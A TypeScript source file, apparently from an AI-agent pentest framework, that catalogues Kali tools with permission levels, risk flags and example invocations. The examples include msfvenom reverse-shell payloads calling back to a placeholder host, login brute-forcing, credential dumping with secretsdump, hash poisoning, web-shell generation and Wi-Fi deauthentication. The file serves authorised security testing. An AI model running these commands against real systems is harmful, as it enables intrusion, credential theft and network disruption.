/**
 * OpenKaliClaude — Kali Tool Catalog
 *
 * A structured knowledge base of the Kali Linux toolchain. This is what gives
 * the agent *full context on how to use* the tools: every entry carries the
 * binary name, its category, the privilege/impact profile the framework needs
 * for scope + confirmation decisions, a one-line purpose, and concrete example
 * invocations the model can adapt.
 *
 * The catalog serves three consumers:
 *   1. `KaliTool`         — uses it to allow-list binaries and derive a risk
 *                           score / confirmation requirement per invocation.
 *   2. `KaliCatalogTool`  — exposes list/search/detail so the model can look up
 *                           usage on demand without every schema living in the
 *                           system prompt.
 *   3. `buildAgentSystemPrompt` — folds the category index into the prompt so
 *                           the model knows the surface area exists.
 *
 * It is intentionally broad rather than exhaustive: it covers the tools most
 * engagements actually reach for across every Kali menu category. Any binary
 * present on the host/container that is *not* catalogued can still be executed
 * through `KaliTool` (see its `allowUncatalogued` path) — the catalog is the
 * curated, documented core, not a hard whitelist of the entire distribution.
 */

import { SecurityPermissionLevel } from '../../../types/security.js'

export type KaliCategory =
  | 'information-gathering'
  | 'vulnerability-analysis'
  | 'web-application'
  | 'database-assessment'
  | 'password-attacks'
  | 'wireless-attacks'
  | 'reverse-engineering'
  | 'exploitation'
  | 'sniffing-spoofing'
  | 'post-exploitation'
  | 'forensics'
  | 'reporting'
  | 'social-engineering'
  | 'crypto-stego'

export interface KaliToolSpec {
  /** Executable name as invoked on the CLI. */
  binary: string
  /** Human-friendly name. */
  name: string
  category: KaliCategory
  /** Framework permission level — drives scope + risk decisions. */
  permission: SecurityPermissionLevel
  /** True if the tool normally needs root (raw sockets, monitor mode, etc.). */
  sudo?: boolean
  /** True if the tool can modify/damage the target (exploits, dumps, DoS). */
  destructive?: boolean
  /** One-line description of what the tool does. */
  summary: string
  /** Concrete example command lines the model can adapt. */
  usage: string[]
  /** Alternative names the model might use. */
  aliases?: string[]
  references?: string[]
}

// ─── Catalog ─────────────────────────────────────────────────────────────────
// Grouped by category for readability; flattened into KALI_TOOLS below.

const INFORMATION_GATHERING: KaliToolSpec[] = [
  { binary: 'nmap', name: 'Nmap', category: 'information-gathering', permission: 'active-recon', sudo: true,
    summary: 'Port scanner and service/OS detection — the reconnaissance workhorse.',
    usage: ['nmap -sV --top-ports 100 TARGET', 'nmap -sS -p- -T4 TARGET', 'nmap -sC -sV -O TARGET', 'nmap --script vuln TARGET'],
    aliases: ['portscan'], references: ['https://nmap.org/book/'] },
  { binary: 'masscan', name: 'Masscan', category: 'information-gathering', permission: 'active-recon', sudo: true,
    summary: 'Internet-scale asynchronous TCP port scanner (very fast, noisy).',
    usage: ['masscan -p1-65535 TARGET --rate 1000', 'masscan -p80,443 10.0.0.0/24 --rate 10000'] },
  { binary: 'rustscan', name: 'RustScan', category: 'information-gathering', permission: 'active-recon',
    summary: 'Ultra-fast port scanner that pipes open ports into nmap.',
    usage: ['rustscan -a TARGET -- -sV -sC'] },
  { binary: 'netdiscover', name: 'Netdiscover', category: 'information-gathering', permission: 'active-recon', sudo: true,
    summary: 'Active/passive ARP host discovery on a local segment.',
    usage: ['netdiscover -r 192.168.1.0/24', 'netdiscover -p'] },
  { binary: 'arp-scan', name: 'arp-scan', category: 'information-gathering', permission: 'active-recon', sudo: true,
    summary: 'Discover live hosts via ARP on the local network.',
    usage: ['arp-scan --localnet', 'arp-scan 192.168.1.0/24'] },
  { binary: 'fping', name: 'fping', category: 'information-gathering', permission: 'active-recon',
    summary: 'Fast ICMP sweep across many hosts.',
    usage: ['fping -a -g 192.168.1.0/24 2>/dev/null'] },
  { binary: 'hping3', name: 'hping3', category: 'information-gathering', permission: 'active-recon', sudo: true, destructive: true,
    summary: 'Crafted TCP/IP packet generator — probing, firewall testing, flooding.',
    usage: ['hping3 -S -p 80 -c 3 TARGET', 'hping3 --traceroute -V -1 TARGET'] },
  { binary: 'dnsrecon', name: 'DNSRecon', category: 'information-gathering', permission: 'passive-recon',
    summary: 'DNS enumeration: records, zone transfers, brute-force, cache snooping.',
    usage: ['dnsrecon -d DOMAIN', 'dnsrecon -d DOMAIN -t axfr', 'dnsrecon -d DOMAIN -D subdomains.txt -t brt'] },
  { binary: 'dnsenum', name: 'dnsenum', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Enumerate DNS info, subdomains, and attempt zone transfers.',
    usage: ['dnsenum DOMAIN'] },
  { binary: 'fierce', name: 'Fierce', category: 'information-gathering', permission: 'passive-recon',
    summary: 'DNS reconnaissance and subdomain locator.',
    usage: ['fierce --domain DOMAIN'] },
  { binary: 'dig', name: 'dig', category: 'information-gathering', permission: 'passive-recon',
    summary: 'DNS lookup utility.',
    usage: ['dig DOMAIN ANY', 'dig axfr @NS DOMAIN'] },
  { binary: 'host', name: 'host', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Simple DNS lookup.',
    usage: ['host DOMAIN', 'host -t mx DOMAIN'] },
  { binary: 'whois', name: 'whois', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Registration/ownership lookup for domains and IPs.',
    usage: ['whois DOMAIN'] },
  { binary: 'theharvester', name: 'theHarvester', category: 'information-gathering', permission: 'passive-recon',
    summary: 'OSINT: harvest emails, hosts, and subdomains from public sources.',
    usage: ['theHarvester -d DOMAIN -b all'], aliases: ['theHarvester'] },
  { binary: 'amass', name: 'OWASP Amass', category: 'information-gathering', permission: 'passive-recon',
    summary: 'In-depth attack-surface mapping and subdomain enumeration.',
    usage: ['amass enum -d DOMAIN', 'amass intel -d DOMAIN'] },
  { binary: 'sublist3r', name: 'Sublist3r', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Enumerate subdomains using OSINT search engines.',
    usage: ['sublist3r -d DOMAIN'] },
  { binary: 'recon-ng', name: 'Recon-ng', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Full-featured web reconnaissance framework.',
    usage: ['recon-ng -w WORKSPACE'] },
  { binary: 'whatweb', name: 'WhatWeb', category: 'information-gathering', permission: 'active-recon',
    summary: 'Fingerprint web technologies, CMS, servers, and frameworks.',
    usage: ['whatweb URL', 'whatweb -a 3 URL'] },
  { binary: 'wafw00f', name: 'wafw00f', category: 'information-gathering', permission: 'active-recon',
    summary: 'Identify and fingerprint Web Application Firewalls.',
    usage: ['wafw00f URL'] },
  { binary: 'dmitry', name: 'DMitry', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Deepmagic information gathering: whois, subdomains, ports, emails.',
    usage: ['dmitry -winsepo output.txt TARGET'] },
  { binary: 'enum4linux', name: 'enum4linux', category: 'information-gathering', permission: 'active-recon',
    summary: 'Enumerate Windows/Samba: users, shares, groups, policies over SMB.',
    usage: ['enum4linux -a TARGET'] },
  { binary: 'enum4linux-ng', name: 'enum4linux-ng', category: 'information-gathering', permission: 'active-recon',
    summary: 'Modern rewrite of enum4linux for SMB/Windows enumeration.',
    usage: ['enum4linux-ng -A TARGET'] },
  { binary: 'smbmap', name: 'SMBMap', category: 'information-gathering', permission: 'active-recon',
    summary: 'Enumerate SMB shares, permissions, and contents.',
    usage: ['smbmap -H TARGET', 'smbmap -u USER -p PASS -H TARGET'] },
  { binary: 'smbclient', name: 'smbclient', category: 'information-gathering', permission: 'active-recon',
    summary: 'FTP-like client for accessing SMB/CIFS shares.',
    usage: ['smbclient -L //TARGET -N', 'smbclient //TARGET/SHARE -U USER'] },
  { binary: 'snmp-check', name: 'snmp-check', category: 'information-gathering', permission: 'active-recon',
    summary: 'Enumerate SNMP-exposed device information.',
    usage: ['snmp-check TARGET -c public'] },
  { binary: 'onesixtyone', name: 'onesixtyone', category: 'information-gathering', permission: 'active-recon',
    summary: 'Fast SNMP community-string scanner.',
    usage: ['onesixtyone -c community.txt TARGET'] },
  { binary: 'sslscan', name: 'sslscan', category: 'information-gathering', permission: 'active-recon',
    summary: 'Enumerate SSL/TLS ciphers, protocols, and certificate details.',
    usage: ['sslscan TARGET:443'] },
  { binary: 'sslyze', name: 'SSLyze', category: 'information-gathering', permission: 'active-recon',
    summary: 'Fast, deep TLS configuration analyzer.',
    usage: ['sslyze TARGET:443'] },
  { binary: 'ike-scan', name: 'ike-scan', category: 'information-gathering', permission: 'active-recon', sudo: true,
    summary: 'Discover and fingerprint IPsec VPN (IKE) endpoints.',
    usage: ['ike-scan TARGET'] },
  { binary: 'traceroute', name: 'traceroute', category: 'information-gathering', permission: 'passive-recon',
    summary: 'Trace the network path to a host.',
    usage: ['traceroute TARGET'] },
]

const VULNERABILITY_ANALYSIS: KaliToolSpec[] = [
  { binary: 'nikto', name: 'Nikto', category: 'vulnerability-analysis', permission: 'vuln-scanning',
    summary: 'Web server scanner for known vulnerabilities and misconfigurations.',
    usage: ['nikto -h URL', 'nikto -h TARGET -p 443 -ssl'] },
  { binary: 'nuclei', name: 'Nuclei', category: 'vulnerability-analysis', permission: 'vuln-scanning',
    summary: 'Template-based vulnerability scanner across large target sets.',
    usage: ['nuclei -u URL', 'nuclei -l hosts.txt -severity critical,high'] },
  { binary: 'wpscan', name: 'WPScan', category: 'vulnerability-analysis', permission: 'vuln-scanning',
    summary: 'WordPress vulnerability scanner (plugins, themes, users).',
    usage: ['wpscan --url URL --enumerate vp,vt,u'] },
  { binary: 'joomscan', name: 'JoomScan', category: 'vulnerability-analysis', permission: 'vuln-scanning',
    summary: 'Joomla CMS vulnerability scanner.',
    usage: ['joomscan --url URL'] },
  { binary: 'lynis', name: 'Lynis', category: 'vulnerability-analysis', permission: 'vuln-scanning', sudo: true,
    summary: 'Host security auditing and hardening assessment (local system).',
    usage: ['lynis audit system'] },
  { binary: 'legion', name: 'Legion', category: 'vulnerability-analysis', permission: 'vuln-scanning',
    summary: 'GUI-driven automated recon and vulnerability discovery framework.',
    usage: ['legion'] },
  { binary: 'nmap', name: 'Nmap NSE (vuln)', category: 'vulnerability-analysis', permission: 'vuln-scanning', sudo: true,
    summary: 'Nmap Scripting Engine vulnerability scripts.',
    usage: ['nmap --script vuln TARGET', 'nmap --script "http-* and not brute" -p80,443 TARGET'] },
  { binary: 'searchsploit', name: 'SearchSploit', category: 'vulnerability-analysis', permission: 'passive-recon',
    summary: 'Offline search of the Exploit-DB archive.',
    usage: ['searchsploit apache 2.4', 'searchsploit -m EDB-ID'] },
]

const WEB_APPLICATION: KaliToolSpec[] = [
  { binary: 'sqlmap', name: 'sqlmap', category: 'web-application', permission: 'exploitation', destructive: true,
    summary: 'Automated SQL injection detection and exploitation.',
    usage: ['sqlmap -u "URL?id=1" --batch', 'sqlmap -u URL --dbs', 'sqlmap -r request.txt --dump'] },
  { binary: 'gobuster', name: 'Gobuster', category: 'web-application', permission: 'web-scanning',
    summary: 'Directory/DNS/vhost brute-forcer (Go, fast).',
    usage: ['gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt', 'gobuster dns -d DOMAIN -w subdomains.txt'] },
  { binary: 'feroxbuster', name: 'feroxbuster', category: 'web-application', permission: 'web-scanning',
    summary: 'Recursive content discovery / forced browsing (Rust).',
    usage: ['feroxbuster -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt'] },
  { binary: 'ffuf', name: 'ffuf', category: 'web-application', permission: 'web-scanning',
    summary: 'Fast web fuzzer for directories, parameters, and vhosts.',
    usage: ['ffuf -u URL/FUZZ -w wordlist.txt', 'ffuf -u URL -H "Host: FUZZ" -w vhosts.txt'] },
  { binary: 'wfuzz', name: 'Wfuzz', category: 'web-application', permission: 'web-scanning',
    summary: 'Web application fuzzer for brute-forcing parameters and paths.',
    usage: ['wfuzz -c -z file,wordlist.txt --hc 404 URL/FUZZ'] },
  { binary: 'dirb', name: 'DIRB', category: 'web-application', permission: 'web-scanning',
    summary: 'Classic web content scanner (dictionary directory brute-force).',
    usage: ['dirb URL /usr/share/wordlists/dirb/common.txt'] },
  { binary: 'gobuster', name: 'dirbuster', category: 'web-application', permission: 'web-scanning',
    summary: 'Directory/file brute forcing (use gobuster/feroxbuster/ffuf).',
    usage: ['gobuster dir -u URL -w wordlist.txt'], aliases: ['dirbuster'] },
  { binary: 'commix', name: 'Commix', category: 'web-application', permission: 'exploitation', destructive: true,
    summary: 'Automated command-injection detection and exploitation.',
    usage: ['commix -u "URL?param=value"'] },
  { binary: 'xsser', name: 'XSSer', category: 'web-application', permission: 'web-scanning', destructive: true,
    summary: 'Automated framework to detect and exploit XSS.',
    usage: ['xsser -u URL'] },
  { binary: 'dotdotpwn', name: 'DotDotPwn', category: 'web-application', permission: 'web-scanning',
    summary: 'Directory-traversal fuzzer.',
    usage: ['dotdotpwn -m http -h TARGET'] },
  { binary: 'skipfish', name: 'Skipfish', category: 'web-application', permission: 'web-scanning',
    summary: 'Active web application security reconnaissance scanner.',
    usage: ['skipfish -o output URL'] },
  { binary: 'wpscan', name: 'WPScan (web)', category: 'web-application', permission: 'web-scanning',
    summary: 'WordPress enumeration and credential brute-force.',
    usage: ['wpscan --url URL --enumerate u', 'wpscan --url URL -U users.txt -P passwords.txt'] },
  { binary: 'cadaver', name: 'cadaver', category: 'web-application', permission: 'web-scanning',
    summary: 'Command-line WebDAV client.',
    usage: ['cadaver URL'] },
  { binary: 'davtest', name: 'DAVTest', category: 'web-application', permission: 'web-scanning', destructive: true,
    summary: 'Test WebDAV servers for file upload / execution.',
    usage: ['davtest -url URL'] },
  { binary: 'whatweb', name: 'WhatWeb (web)', category: 'web-application', permission: 'active-recon',
    summary: 'Fingerprint the web stack before deeper testing.',
    usage: ['whatweb -a 3 URL'] },
  { binary: 'burpsuite', name: 'Burp Suite', category: 'web-application', permission: 'web-scanning',
    summary: 'Intercepting proxy and web app testing platform (GUI).',
    usage: ['burpsuite'] },
  { binary: 'zaproxy', name: 'OWASP ZAP', category: 'web-application', permission: 'web-scanning',
    summary: 'Web app scanner / intercepting proxy; supports headless automation.',
    usage: ['zaproxy', 'zaproxy -cmd -quickurl URL -quickout report.html'] },
]

const DATABASE_ASSESSMENT: KaliToolSpec[] = [
  { binary: 'sqlmap', name: 'sqlmap (db)', category: 'database-assessment', permission: 'exploitation', destructive: true,
    summary: 'Enumerate and extract database contents via SQL injection.',
    usage: ['sqlmap -u URL --tables -D dbname', 'sqlmap -u URL --dump -T users'] },
  { binary: 'sqlninja', name: 'sqlninja', category: 'database-assessment', permission: 'exploitation', destructive: true,
    summary: 'MS SQL Server injection and takeover toolkit.',
    usage: ['sqlninja -f config.conf -m test'] },
]

const PASSWORD_ATTACKS: KaliToolSpec[] = [
  { binary: 'hashcat', name: 'Hashcat', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'GPU-accelerated password/hash cracker.',
    usage: ['hashcat -m 0 -a 0 hashes.txt rockyou.txt', 'hashcat -m 1000 -a 3 ntlm.txt "?a?a?a?a?a?a"'] },
  { binary: 'john', name: 'John the Ripper', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'CPU password cracker with many hash formats and rules.',
    usage: ['john --wordlist=rockyou.txt hashes.txt', 'john --format=NT hashes.txt', 'zip2john file.zip > hash'], aliases: ['john-the-ripper'] },
  { binary: 'hydra', name: 'Hydra', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'Network login brute-forcer (ssh, ftp, http, smb, rdp, ...).',
    usage: ['hydra -l admin -P rockyou.txt ssh://TARGET', 'hydra -L users.txt -P pass.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"'] },
  { binary: 'medusa', name: 'Medusa', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'Parallel, modular network login brute-forcer.',
    usage: ['medusa -h TARGET -u admin -P pass.txt -M ssh'] },
  { binary: 'ncrack', name: 'Ncrack', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'High-speed network authentication cracker (from the Nmap project).',
    usage: ['ncrack -u admin -P pass.txt ssh://TARGET'] },
  { binary: 'crackmapexec', name: 'CrackMapExec', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'Swiss-army knife for AD/SMB: spraying, enumeration, execution.',
    usage: ['crackmapexec smb TARGET -u users.txt -p pass.txt', 'crackmapexec smb 10.0.0.0/24 -u USER -p PASS --shares'], aliases: ['cme', 'netexec'] },
  { binary: 'patator', name: 'Patator', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'Flexible multi-purpose brute-forcer.',
    usage: ['patator ssh_login host=TARGET user=admin password=FILE0 0=pass.txt'] },
  { binary: 'crowbar', name: 'Crowbar', category: 'password-attacks', permission: 'brute-force', destructive: true,
    summary: 'Brute-forcing for protocols Hydra lacks (RDP w/ NLA, OpenVPN, key-based SSH).',
    usage: ['crowbar -b rdp -s TARGET/32 -u admin -C pass.txt'] },
  { binary: 'crunch', name: 'crunch', category: 'password-attacks', permission: 'passive-recon',
    summary: 'Generate custom wordlists by pattern.',
    usage: ['crunch 8 8 -t @@@@%%%% -o wordlist.txt'] },
  { binary: 'cewl', name: 'CeWL', category: 'password-attacks', permission: 'active-recon',
    summary: 'Spider a site to build a target-specific wordlist.',
    usage: ['cewl URL -w wordlist.txt'] },
  { binary: 'cupp', name: 'CUPP', category: 'password-attacks', permission: 'passive-recon',
    summary: 'Build personalized wordlists from a profile (OSINT).',
    usage: ['cupp -i'] },
  { binary: 'hashid', name: 'hashID', category: 'password-attacks', permission: 'passive-recon',
    summary: 'Identify hash types.',
    usage: ['hashid HASH'] },
  { binary: 'hash-identifier', name: 'hash-identifier', category: 'password-attacks', permission: 'passive-recon',
    summary: 'Identify the algorithm behind a hash.',
    usage: ['hash-identifier'] },
  { binary: 'chntpw', name: 'chntpw', category: 'password-attacks', permission: 'privilege-escalation', sudo: true, destructive: true,
    summary: 'Reset/edit Windows SAM passwords offline.',
    usage: ['chntpw -l SAM'] },
]

const WIRELESS_ATTACKS: KaliToolSpec[] = [
  { binary: 'aircrack-ng', name: 'Aircrack-ng', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Crack WEP/WPA-PSK keys from captured handshakes.',
    usage: ['aircrack-ng -w rockyou.txt capture.cap'] },
  { binary: 'airmon-ng', name: 'Airmon-ng', category: 'wireless-attacks', permission: 'wireless', sudo: true,
    summary: 'Enable/disable monitor mode on wireless interfaces.',
    usage: ['airmon-ng start wlan0', 'airmon-ng check kill'] },
  { binary: 'airodump-ng', name: 'Airodump-ng', category: 'wireless-attacks', permission: 'wireless', sudo: true,
    summary: 'Capture raw 802.11 frames and discover APs/clients.',
    usage: ['airodump-ng wlan0mon', 'airodump-ng -c 6 --bssid AP -w capture wlan0mon'] },
  { binary: 'aireplay-ng', name: 'Aireplay-ng', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Inject frames — deauth, fake auth, replay to force handshakes.',
    usage: ['aireplay-ng --deauth 5 -a AP -c CLIENT wlan0mon'] },
  { binary: 'reaver', name: 'Reaver', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Brute-force WPS PINs to recover WPA/WPA2 passphrases.',
    usage: ['reaver -i wlan0mon -b AP -vv'] },
  { binary: 'wash', name: 'Wash', category: 'wireless-attacks', permission: 'wireless', sudo: true,
    summary: 'Identify WPS-enabled access points.',
    usage: ['wash -i wlan0mon'] },
  { binary: 'wifite', name: 'Wifite', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Automated wireless auditing across WEP/WPA/WPS.',
    usage: ['wifite', 'wifite --kill'] },
  { binary: 'kismet', name: 'Kismet', category: 'wireless-attacks', permission: 'wireless', sudo: true,
    summary: 'Wireless network detector, sniffer, and IDS.',
    usage: ['kismet -c wlan0'] },
  { binary: 'mdk4', name: 'MDK4', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: '802.11 stress/attack tool (deauth floods, beacon spam).',
    usage: ['mdk4 wlan0mon d -b blacklist.txt'] },
  { binary: 'hcxdumptool', name: 'hcxdumptool', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Capture PMKID/handshakes from WPA networks.',
    usage: ['hcxdumptool -i wlan0mon -o dump.pcapng'] },
  { binary: 'hcxpcapngtool', name: 'hcxpcapngtool', category: 'wireless-attacks', permission: 'wireless',
    summary: 'Convert captures into hashcat-crackable format.',
    usage: ['hcxpcapngtool -o hash.hc22000 dump.pcapng'] },
  { binary: 'cowpatty', name: 'coWPAtty', category: 'wireless-attacks', permission: 'wireless', destructive: true,
    summary: 'Offline dictionary attack against WPA-PSK.',
    usage: ['cowpatty -r capture.cap -f rockyou.txt -s SSID'] },
  { binary: 'bettercap', name: 'Bettercap', category: 'wireless-attacks', permission: 'wireless', sudo: true, destructive: true,
    summary: 'Swiss-army knife for WiFi, BLE, and network MITM attacks.',
    usage: ['bettercap -iface wlan0'] },
]

const REVERSE_ENGINEERING: KaliToolSpec[] = [
  { binary: 'gdb', name: 'GDB', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'GNU debugger for native binaries.',
    usage: ['gdb ./binary', 'gdb -p PID'] },
  { binary: 'radare2', name: 'radare2', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Reverse-engineering framework (disassembler, debugger, hex).',
    usage: ['r2 -A ./binary'], aliases: ['r2'] },
  { binary: 'objdump', name: 'objdump', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Display information from and disassemble object files.',
    usage: ['objdump -d ./binary', 'objdump -M intel -d ./binary'] },
  { binary: 'ltrace', name: 'ltrace', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Trace library calls of a running program.',
    usage: ['ltrace ./binary'] },
  { binary: 'strace', name: 'strace', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Trace system calls and signals.',
    usage: ['strace ./binary', 'strace -f -e trace=network ./binary'] },
  { binary: 'strings', name: 'strings', category: 'reverse-engineering', permission: 'passive-recon',
    summary: 'Extract printable strings from a file.',
    usage: ['strings ./binary', 'strings -n 8 ./binary'] },
  { binary: 'apktool', name: 'Apktool', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Decode/rebuild Android APK resources and smali.',
    usage: ['apktool d app.apk', 'apktool b app'] },
  { binary: 'jadx', name: 'jadx', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'Decompile Android DEX/APK to readable Java.',
    usage: ['jadx app.apk -d out'] },
  { binary: 'ghidra', name: 'Ghidra', category: 'reverse-engineering', permission: 'reverse-shell',
    summary: 'NSA software reverse-engineering suite (GUI).',
    usage: ['ghidra'] },
]

const EXPLOITATION: KaliToolSpec[] = [
  { binary: 'msfconsole', name: 'Metasploit Framework', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'Exploit development and execution framework.',
    usage: ['msfconsole -q -r script.rc', 'msfconsole -x "use exploit/...; set RHOSTS TARGET; run"'], aliases: ['metasploit', 'msf'] },
  { binary: 'msfvenom', name: 'msfvenom', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'Generate and encode Metasploit payloads.',
    usage: ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe', 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell'] },
  { binary: 'searchsploit', name: 'SearchSploit (exploit)', category: 'exploitation', permission: 'passive-recon',
    summary: 'Find and copy proof-of-concept exploits from Exploit-DB.',
    usage: ['searchsploit -w SERVICE VERSION', 'searchsploit -x EDB-ID'] },
  { binary: 'routersploit', name: 'RouterSploit', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'Exploitation framework for embedded devices / routers.',
    usage: ['routersploit', 'rsf'] },
  { binary: 'setoolkit', name: 'Social-Engineer Toolkit', category: 'exploitation', permission: 'social-engineering', destructive: true,
    summary: 'Framework for social-engineering attack simulations.',
    usage: ['setoolkit'], aliases: ['set'] },
  { binary: 'beef-xss', name: 'BeEF', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'Browser Exploitation Framework — hook and control browsers.',
    usage: ['beef-xss'] },
  { binary: 'evil-winrm', name: 'Evil-WinRM', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'WinRM shell for authenticated Windows access / post-ex.',
    usage: ['evil-winrm -i TARGET -u USER -p PASS'] },
  { binary: 'impacket-psexec', name: 'Impacket psexec', category: 'exploitation', permission: 'exploitation', destructive: true,
    summary: 'Impacket remote command execution over SMB.',
    usage: ['impacket-psexec DOMAIN/USER:PASS@TARGET'], aliases: ['psexec.py'] },
]

const SNIFFING_SPOOFING: KaliToolSpec[] = [
  { binary: 'wireshark', name: 'Wireshark', category: 'sniffing-spoofing', permission: 'passive-recon', sudo: true,
    summary: 'Graphical network protocol analyzer.',
    usage: ['wireshark', 'wireshark -i eth0 -k'] },
  { binary: 'tshark', name: 'TShark', category: 'sniffing-spoofing', permission: 'passive-recon', sudo: true,
    summary: 'Terminal Wireshark — capture and dissect packets.',
    usage: ['tshark -i eth0', 'tshark -r capture.pcap -Y http'] },
  { binary: 'tcpdump', name: 'tcpdump', category: 'sniffing-spoofing', permission: 'passive-recon', sudo: true,
    summary: 'Command-line packet capture.',
    usage: ['tcpdump -i eth0 -w out.pcap', 'tcpdump -i eth0 port 80 -A'] },
  { binary: 'ettercap', name: 'Ettercap', category: 'sniffing-spoofing', permission: 'exploitation', sudo: true, destructive: true,
    summary: 'MITM suite for LAN — ARP poisoning, sniffing, filtering.',
    usage: ['ettercap -T -q -M arp:remote /TARGET// /GATEWAY//'] },
  { binary: 'responder', name: 'Responder', category: 'sniffing-spoofing', permission: 'exploitation', sudo: true, destructive: true,
    summary: 'LLMNR/NBT-NS/mDNS poisoner to capture NetNTLM hashes.',
    usage: ['responder -I eth0 -wv'] },
  { binary: 'bettercap', name: 'Bettercap (MITM)', category: 'sniffing-spoofing', permission: 'exploitation', sudo: true, destructive: true,
    summary: 'Network MITM, sniffing, and spoofing framework.',
    usage: ['bettercap -iface eth0'] },
  { binary: 'mitmproxy', name: 'mitmproxy', category: 'sniffing-spoofing', permission: 'web-scanning',
    summary: 'Interactive intercepting HTTP/HTTPS proxy.',
    usage: ['mitmproxy', 'mitmdump -w flows'] },
  { binary: 'macchanger', name: 'macchanger', category: 'sniffing-spoofing', permission: 'active-recon', sudo: true,
    summary: 'View and spoof network interface MAC addresses.',
    usage: ['macchanger -r eth0', 'macchanger -m 00:11:22:33:44:55 eth0'] },
  { binary: 'arpspoof', name: 'arpspoof', category: 'sniffing-spoofing', permission: 'exploitation', sudo: true, destructive: true,
    summary: 'ARP cache poisoning (dsniff suite).',
    usage: ['arpspoof -i eth0 -t TARGET GATEWAY'] },
]

const POST_EXPLOITATION: KaliToolSpec[] = [
  { binary: 'proxychains', name: 'proxychains', category: 'post-exploitation', permission: 'exploitation',
    summary: 'Force any TCP tool through a proxy/pivot chain.',
    usage: ['proxychains nmap -sT -Pn TARGET', 'proxychains4 curl URL'], aliases: ['proxychains4'] },
  { binary: 'chisel', name: 'Chisel', category: 'post-exploitation', permission: 'exploitation',
    summary: 'Fast TCP/UDP tunnel over HTTP for pivoting.',
    usage: ['chisel server -p 8080 --reverse', 'chisel client SERVER:8080 R:socks'] },
  { binary: 'weevely', name: 'Weevely', category: 'post-exploitation', permission: 'exploitation', destructive: true,
    summary: 'Generate and manage a stealth PHP web shell.',
    usage: ['weevely generate PASS shell.php', 'weevely URL PASS'] },
  { binary: 'evil-winrm', name: 'Evil-WinRM (post-ex)', category: 'post-exploitation', permission: 'exploitation', destructive: true,
    summary: 'Interactive WinRM session for Windows post-exploitation.',
    usage: ['evil-winrm -i TARGET -u USER -H NTLMHASH'] },
  { binary: 'impacket-secretsdump', name: 'Impacket secretsdump', category: 'post-exploitation', permission: 'exploitation', destructive: true,
    summary: 'Dump SAM/LSA/NTDS secrets from a Windows target.',
    usage: ['impacket-secretsdump DOMAIN/USER:PASS@TARGET'], aliases: ['secretsdump.py'] },
  { binary: 'linpeas', name: 'LinPEAS', category: 'post-exploitation', permission: 'privilege-escalation',
    summary: 'Linux privilege-escalation enumeration script.',
    usage: ['./linpeas.sh'] },
  { binary: 'winpeas', name: 'WinPEAS', category: 'post-exploitation', permission: 'privilege-escalation',
    summary: 'Windows privilege-escalation enumeration.',
    usage: ['winpeas.exe'] },
]

const FORENSICS: KaliToolSpec[] = [
  { binary: 'binwalk', name: 'Binwalk', category: 'forensics', permission: 'forensics',
    summary: 'Analyze and extract firmware/embedded files.',
    usage: ['binwalk file.bin', 'binwalk -e file.bin'] },
  { binary: 'foremost', name: 'Foremost', category: 'forensics', permission: 'forensics',
    summary: 'File carving / recovery based on headers and footers.',
    usage: ['foremost -i image.dd -o output'] },
  { binary: 'scalpel', name: 'Scalpel', category: 'forensics', permission: 'forensics',
    summary: 'Fast file carver from disk images.',
    usage: ['scalpel image.dd -o output'] },
  { binary: 'volatility', name: 'Volatility', category: 'forensics', permission: 'forensics',
    summary: 'Memory forensics framework.',
    usage: ['volatility -f mem.raw imageinfo', 'volatility -f mem.raw --profile=P pslist'], aliases: ['vol'] },
  { binary: 'bulk_extractor', name: 'bulk_extractor', category: 'forensics', permission: 'forensics',
    summary: 'Scan disk images for emails, URLs, credit-card numbers, etc.',
    usage: ['bulk_extractor -o output image.dd'] },
  { binary: 'exiftool', name: 'ExifTool', category: 'forensics', permission: 'forensics',
    summary: 'Read/write metadata in files (images, docs, media).',
    usage: ['exiftool file.jpg'] },
  { binary: 'autopsy', name: 'Autopsy', category: 'forensics', permission: 'forensics',
    summary: 'Graphical digital forensics platform (Sleuth Kit front-end).',
    usage: ['autopsy'] },
  { binary: 'testdisk', name: 'TestDisk', category: 'forensics', permission: 'forensics', sudo: true,
    summary: 'Recover lost partitions and repair boot sectors.',
    usage: ['testdisk'] },
  { binary: 'photorec', name: 'PhotoRec', category: 'forensics', permission: 'forensics', sudo: true,
    summary: 'File recovery focused on media and documents.',
    usage: ['photorec'] },
